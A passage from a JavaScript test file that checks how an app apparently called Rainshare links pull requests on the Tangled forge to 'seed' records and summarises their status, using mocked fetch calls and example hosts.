    // Pull requests that mention the issue's address, or the seed's link, are found; passing mentions of other things aren't.
    assert.deepEqual(await linkedPulls(pasted, { rkey: '3kseedkey1' }), [
      { url: 'https://tangled.org/alice.example/garden/pulls/15', number: 15, title: 'Another go', by: null, state: 'open' },
      { url: 'https://tangled.org/alice.example/garden/pulls/3mpull1', number: null, title: 'Sitemap', by: null, state: 'merged' }   // found by search
    ]);
    assert.deepEqual((await linkedPulls({ $type: SEED + '#repo', url: 'https://tangled.org/alice.example/garden', forge: 'tangled' }, { rkey: '3kseedkey1' })).map(p => p.number), [15]);
    // All of it together: a seed on that issue, looked at and summed up for whoever planted it.
    const seed = await look({ uri: 'at://did:plc:planter/dev.rainshare.seed/3kseedkey1', repo: 'did:plc:planter', author: { handle: 'p.example' }, value: { title: 'Sitemap', subject: pasted }, deliveries: [{ uri: 'at://did:plc:h/dev.rainshare.delivery/1', repo: 'did:plc:h', author: { handle: 'h.example' }, value: { url: 'https://tangled.org/alice.example/garden/pulls/3mpull1' } }] });
    const st = standing(seed, { viewer: 'did:plc:planter' });
    assert.deepEqual([st.issue, st.verdict, st.planter.do, st.linked.length], ['open', 'merged', 'sprout', 1]);
    assert.match(st.lines.join(' '), /The issue is still open on Tangled\..*@h\.example turned in https:\/\/tangled\.org\/alice\.example\/garden\/pulls\/3mpull1 \(merged\).*On Tangled, pull request #15 mentions it \(open\) and hasn’t been turned in on Rainshare/);
    assert.ok(!asked.some(m => /^sh\.tangled/.test(m)));
  } finally { globalThis.fetch = real; }
});
